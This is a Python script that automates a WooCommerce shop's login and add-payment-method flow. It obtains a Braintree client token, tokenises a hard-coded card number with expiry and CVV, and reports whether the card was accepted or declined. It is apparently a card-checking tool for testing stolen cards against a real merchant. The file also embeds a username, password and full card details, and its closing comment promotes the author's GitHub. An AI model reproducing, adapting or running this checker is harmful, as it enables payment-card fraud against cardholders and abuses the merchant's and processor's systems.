import requests
import json
import base64
import re
import uuid
from bs4 import BeautifulSoup

session = requests.Session()

headers_1 = {
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    'accept-language': 'en-US,en;q=0.5',
    'cache-control': 'max-age=0',
    'priority': 'u=0, i',
    'referer': 'https://www.kaffn8.com/my-account/',
    'sec-ch-ua': '"Chromium";v="154", "Brave";v="154", "Not A(Brand";v="99"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'sec-gpc': '1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/154.0.0.0 Safari/537.36',
}

r1 = session.get('https://www.kaffn8.com/my-account/', headers=headers_1)

soup = BeautifulSoup(r1.text, 'html.parser')
lnonce = soup.find('input', {'name': 'woocommerce-login-nonce'})['value']

headers_2 = {
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    'accept-language': 'en-US,en;q=0.5',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://www.kaffn8.com',
    'priority': 'u=0, i',
    'referer': 'https://www.kaffn8.com/my-account/',
    'sec-ch-ua': '"Chromium";v="154", "Brave";v="154", "Not A(Brand";v="99"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'sec-gpc': '1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/154.0.0.0 Safari/537.36',
}

data_1 = {
    'username': 'xdiwas',
    'password': '@diwaskhatri',
    'rememberme': 'forever',
    'woocommerce-login-nonce': lnonce,
    '_wp_http_referer': '/my-account/',
    'login': 'Log in',
}

r2 = session.post('https://www.kaffn8.com/my-account/', headers=headers_2, data=data_1)

headers_3 = {
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    'accept-language': 'en-US,en;q=0.5',
    'priority': 'u=0, i',
    'referer': 'https://www.kaffn8.com/my-account/payment-methods/',
    'sec-ch-ua': '"Chromium";v="154", "Brave";v="154", "Not A(Brand";v="99"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'sec-gpc': '1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/154.0.0.0 Safari/537.36',
}

r3 = session.get('https://www.kaffn8.com/my-account/add-payment-method/', headers=headers_3)

print(r3.status_code)
soup3 = BeautifulSoup(r3.text, 'html.parser')
html3 = r3.text

woo_nonce = soup3.find('input', {'name': 'woocommerce-add-payment-method-nonce'})['value']
client_token_nonce = re.search(r'"client_token_nonce"\s*:\s*"([^"]+)"', html3).group(1)

headers_4 = {
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.5',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'origin': 'https://www.kaffn8.com',
    'priority': 'u=1, i',
    'referer': 'https://www.kaffn8.com/my-account/add-payment-method/',
    'sec-ch-ua': '"Chromium";v="154", "Brave";v="154", "Not A(Brand";v="99"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'sec-gpc': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/154.0.0.0 Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}

data_4 = {
    'action': 'wc_braintree_credit_card_get_client_token',
    'nonce': client_token_nonce,
}

r4 = session.post('https://www.kaffn8.com/wp-admin/admin-ajax.php', headers=headers_4, data=data_4)

ajax_json = r4.json()
CLIENT_TOKEN = ajax_json['data'] if isinstance(ajax_json['data'], str) else ajax_json['data'].get('clientToken')

token_data = json.loads(base64.b64decode(CLIENT_TOKEN))
AUTH_FINGERPRINT = token_data['authorizationFingerprint']

session_id = str(uuid.uuid4())
correlation_id = session_id[:32]

headers_5 = {
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.5',
    'authorization': f'Bearer {AUTH_FINGERPRINT}',
    'braintree-version': '2018-05-10',
    'content-type': 'application/json',
    'origin': 'https://assets.braintreegateway.com',
    'priority': 'u=1, i',
    'referer': 'https://assets.braintreegateway.com/',
    'sec-ch-ua': '"Chromium";v="154", "Brave";v="154", "Not A(Brand";v="99"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'sec-gpc': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/154.0.0.0 Safari/537.36',
}

json_data = {
    'clientSdkMetadata': {
        'source': 'client',
        'integration': 'custom',
        'sessionId': session_id,
    },
    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId         business         consumer         purchase         corporate       }     }   } }',
    'variables': {
        'input': {
            'creditCard': {
                'number': '4496130001514478',
                'expirationMonth': '05',
                'expirationYear': '2029',
                'cvv': '575',
            },
            'options': {
                'validate': False,
            },
        },
    },
    'operationName': 'TokenizeCreditCard',
}

r5 = session.post('https://payments.braintree-api.com/graphql', headers=headers_5, json=json_data)

r5_json = r5.json()['data']['tokenizeCreditCard']
token = r5_json['token']

headers_6 = {
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    'accept-language': 'en-US,en;q=0.5',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://www.kaffn8.com',
    'priority': 'u=0, i',
    'referer': 'https://www.kaffn8.com/my-account/add-payment-method/',
    'sec-ch-ua': '"Chromium";v="154", "Brave";v="154", "Not A(Brand";v="99"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'sec-gpc': '1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/154.0.0.0 Safari/537.36',
}

data_6 = [
    ('payment_method', 'braintree_credit_card'),
    ('wc-braintree-credit-card-card-type', 'visa'),
    ('wc-braintree-credit-card-3d-secure-enabled', ''),
    ('wc-braintree-credit-card-3d-secure-verified', ''),
    ('wc-braintree-credit-card-3d-secure-order-total', '0.00'),
    ('wc_braintree_credit_card_payment_nonce', token),
    ('wc_braintree_device_data', '{"correlation_id":"10226862-42ae-46d0-ba75-66296b6c"}'),
    ('wc-braintree-credit-card-tokenize-payment-method', 'true'),
    ('wc_braintree_paypal_payment_nonce', ''),
    ('wc-braintree-paypal-context', 'shortcode'),
    ('wc_braintree_paypal_amount', '0.00'),
    ('wc_braintree_paypal_currency', 'USD'),
    ('wc_braintree_paypal_locale', 'en_us'),
    ('wc-braintree-paypal-tokenize-payment-method', 'true'),
    ('woocommerce-add-payment-method-nonce', woo_nonce),
    ('_wp_http_referer', '/my-account/add-payment-method/'),
    ('woocommerce_add_payment_method', '1'),
]

r6 = session.post('https://www.kaffn8.com/my-account/add-payment-method/', headers=headers_6, data=data_6)

print(f"Here is Token Nonce - {token}")
print(f"Here is Woo Nonce - {woo_nonce}")
print(f"Here is barrer - {AUTH_FINGERPRINT}")

r6 = r6.text

if "payment method added" in r6:
    print("Payment method added successfully")
else:
    m = re.search(r'Status code \d+:[^<."]+', r6) or re.search(r'Reason:\s*([^<."]+)', r6)
    print(f"DECLINED: {m.group(0).strip() if m else 'Unknown'}")



# done finally now we need to test the payment method
#
# i will give you src code in github so follow me on github
#
# here is my github - github.com/diwaskhatri07
#
#
